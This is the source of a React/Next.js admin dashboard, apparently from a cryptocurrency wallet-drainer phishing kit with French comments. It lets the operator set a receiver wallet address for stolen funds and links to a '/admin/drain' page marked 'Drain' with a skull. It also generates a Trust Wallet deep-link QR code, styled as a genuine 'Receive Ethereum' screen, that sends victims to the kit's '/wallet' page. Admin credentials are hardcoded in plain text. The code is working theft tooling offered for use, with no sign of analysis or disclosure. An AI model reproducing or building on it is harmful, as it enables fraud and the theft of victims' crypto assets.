"use client";

import { useState, useEffect, useRef } from "react";

export default function AdminPage() {
  const [receiverAddress, setReceiverAddress] = useState("");
  const [savedReceiver, setSavedReceiver] = useState("");
  const [saving, setSaving] = useState(false);
  const [qrUrl, setQrUrl] = useState("");
  const [isMounted, setIsMounted] = useState(false);
  const qrCanvasRef = useRef<HTMLDivElement>(null);
  const qrCodeInstanceRef = useRef<any>(null);

  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [usernameInput, setUsernameInput] = useState("");
  const [passwordInput, setPasswordInput] = useState("");
  const [authError, setAuthError] = useState("");
  const [toast, setToast] = useState("");

  const showToast = (msg: string) => {
    setToast(msg);
    setTimeout(() => setToast(""), 2000);
  };

  useEffect(() => {
    if (typeof window !== "undefined") {
      const auth = sessionStorage.getItem("admin_auth");
      if (auth === "true") setIsAuthenticated(true);
      setIsMounted(true);
    }
  }, []);

  // Charger la config actuelle
  useEffect(() => {
    if (!isAuthenticated) return;
    fetch("/api/config")
      .then((r) => r.json())
      .then((data) => {
        if (data.config?.receiver_address) {
          setReceiverAddress(data.config.receiver_address);
          setSavedReceiver(data.config.receiver_address);
        }
      })
      .catch(() => {});
  }, [isAuthenticated]);

  // QR neutre
  useEffect(() => {
    if (!isMounted || !isAuthenticated) return;
    const origin = window.location.origin;
    const targetUrl = `${origin}/wallet`;
    setQrUrl(`https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(targetUrl)}`);
  }, [isMounted, isAuthenticated]);

  useEffect(() => {
    if (!qrUrl || typeof window === "undefined" || !isMounted || !isAuthenticated) return;
    import("qr-code-styling").then((QRCodeStylingModule) => {
      const QRCodeStyling = QRCodeStylingModule.default;
      const options = {
        width: 260,
        height: 260,
        type: "svg" as const,
        data: qrUrl,
        image: "/trust.png",
        dotsOptions: { color: "#000000", type: "extra-rounded" as const },
        cornersSquareOptions: { color: "#000000", type: "extra-rounded" as const },
        cornersDotOptions: { color: "#000000", type: "dot" as const },
        backgroundOptions: { color: "#ffffff" },
        imageOptions: { crossOrigin: "anonymous", margin: 6, imageSize: 0.35, hideBackgroundDots: true },
      };
      if (!qrCodeInstanceRef.current) {
        qrCodeInstanceRef.current = new QRCodeStyling(options);
        if (qrCanvasRef.current) {
          qrCanvasRef.current.innerHTML = "";
          qrCodeInstanceRef.current.append(qrCanvasRef.current);
        }
      } else {
        qrCodeInstanceRef.current.update(options);
      }
    });
  }, [qrUrl, isMounted, isAuthenticated]);

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    if (usernameInput === "admin" && passwordInput === "Dubai2026") {
      setIsAuthenticated(true);
      sessionStorage.setItem("admin_auth", "true");
    } else {
      setAuthError("Identifiants incorrects.");
    }
  };

  const handleSaveReceiver = async () => {
    if (!/^0x[a-fA-F0-9]{40}$/.test(receiverAddress)) {
      showToast("Adresse invalide");
      return;
    }
    setSaving(true);
    try {
      const res = await fetch("/api/config", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          receiver_address: receiverAddress,
          password: "Dubai2026",
        }),
      });
      if (res.ok) {
        setSavedReceiver(receiverAddress);
        showToast("✅ Receiver sauvegardé");
      } else {
        showToast("❌ Erreur de sauvegarde");
      }
    } catch {
      showToast("❌ Erreur réseau");
    } finally {
      setSaving(false);
    }
  };

  const handleLogout = () => {
    setIsAuthenticated(false);
    sessionStorage.removeItem("admin_auth");
  };

  if (!isAuthenticated && isMounted) {
    return (
      <main className="transfer-main" style={{ justifyContent: "center" }}>
        <div className="home-content" style={{ maxWidth: "400px", margin: "auto 0" }}>
          <h1 className="home-title" style={{ marginBottom: "1.5rem" }}>Admin Access</h1>
          <form onSubmit={handleLogin} className="form-container" style={{ width: "100%", textAlign: "left" }}>
            <label className="form-label">Username</label>
            <div className="input-row" style={{ marginBottom: "1.25rem" }}>
              <input type="text" value={usernameInput} onChange={(e) => setUsernameInput(e.target.value)} className="input-row__field" required />
            </div>
            <label className="form-label">Password</label>
            <div className="input-row" style={{ marginBottom: "1.5rem" }}>
              <input type="password" value={passwordInput} onChange={(e) => setPasswordInput(e.target.value)} className="input-row__field" required />
            </div>
            {authError && <div style={{ color: "#ef4444", fontSize: "0.85rem", marginBottom: "1rem" }}>⚠️ {authError}</div>}
            <button type="submit" className="next-btn" style={{ width: "100%", padding: "0.75rem" }}>Login</button>
          </form>
        </div>
      </main>
    );
  }

  if (!isMounted) return null;

  return (
    <main className="transfer-main">
      <div className="home-content" style={{ maxWidth: "440px", width: "100%", margin: "0 auto 3rem auto" }}>
        <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "1.25rem" }}>
          <h1 className="home-title" style={{ margin: 0, fontSize: "1.5rem" }}>Admin Dashboard</h1>
          <div style={{ display: "flex", gap: "0.5rem" }}>
            <a href="/admin/drain" style={{ background: "#dcfce7", border: "none", color: "#16a34a", fontWeight: 600, padding: "0.35rem 0.85rem", borderRadius: "1rem", cursor: "pointer", textDecoration: "none", fontSize: "0.85rem" }}>
              💀 Drain
            </a>
            <button onClick={handleLogout} style={{ background: "#fee2e2", border: "none", color: "#dc2626", fontWeight: 600, padding: "0.35rem 0.85rem", borderRadius: "1rem", cursor: "pointer" }}>
              Logout 🚪
            </button>
          </div>
        </div>

        {/* Configuration du Receiver */}
        <div className="form-container" style={{ width: "100%", marginBottom: "2rem" }}>
          <label className="form-label">Receiver Address (Wallet 2)</label>
          <div className="input-row" style={{ marginBottom: "0.75rem" }}>
            <input
              type="text"
              value={receiverAddress}
              onChange={(e) => setReceiverAddress(e.target.value)}
              className="input-row__field"
              placeholder="0x..."
            />
          </div>
          {receiverAddress && !/^0x[a-fA-F0-9]{40}$/.test(receiverAddress) && (
            <div style={{ color: "#ef4444", fontSize: "0.8rem", marginBottom: "0.75rem" }}>
              Adresse invalide
            </div>
          )}
          {savedReceiver && savedReceiver === receiverAddress && (
            <div style={{ color: "#16a34a", fontSize: "0.8rem", marginBottom: "0.75rem" }}>
              ✅ Sauvegardé : {savedReceiver.slice(0, 10)}...{savedReceiver.slice(-8)}
            </div>
          )}
          <button
            onClick={handleSaveReceiver}
            disabled={saving}
            className="next-btn"
            style={{ width: "100%", backgroundColor: "#0033ff" }}
          >
            {saving ? "Sauvegarde..." : "💾 Sauvegarder le Receiver"}
          </button>
        </div>

        {/* QR Code */}
        <div className="admin-qr-section">
          <div className="receive-header-bar">
            <button type="button" className="receive-header-btn">
              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#1e293b" strokeWidth="2.5">
                <line x1="18" y1="6" x2="6" y2="18" />
                <line x1="6" y1="6" x2="18" y2="18" />
              </svg>
            </button>
            <span className="receive-header-title">Receive</span>
            <div style={{ width: 36 }} />
          </div>

          <div className="receive-eth-badge">
            <img src="/eth.png" alt="Ethereum" className="receive-eth-badge-img" />
            <span className="receive-eth-badge-text">Ethereum</span>
          </div>

          {qrUrl ? (
            <div className="qr-preview-card">
              <div ref={qrCanvasRef} style={{ display: "flex", justifyContent: "center" }} />
            </div>
          ) : (
            <div style={{ width: "100%", height: 260, display: "flex", alignItems: "center", justifyContent: "center", background: "#fff", borderRadius: "1.5rem", border: "1px solid #e5e7eb" }}>
              Generating QR code...
            </div>
          )}

          <div className="receive-alert-banner">
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none">
              <circle cx="12" cy="12" r="10" fill="#ea580c" />
              <line x1="12" y1="8" x2="12" y2="13" stroke="#fff" strokeWidth="2.5" />
              <circle cx="12" cy="16.5" r="1.2" fill="#fff" />
            </svg>
            <div className="receive-alert-text">Only send Ethereum assets to this address.</div>
          </div>
        </div>

        {toast && <div className="copy-toast">{toast}</div>}
      </div>
    </main>
  );
}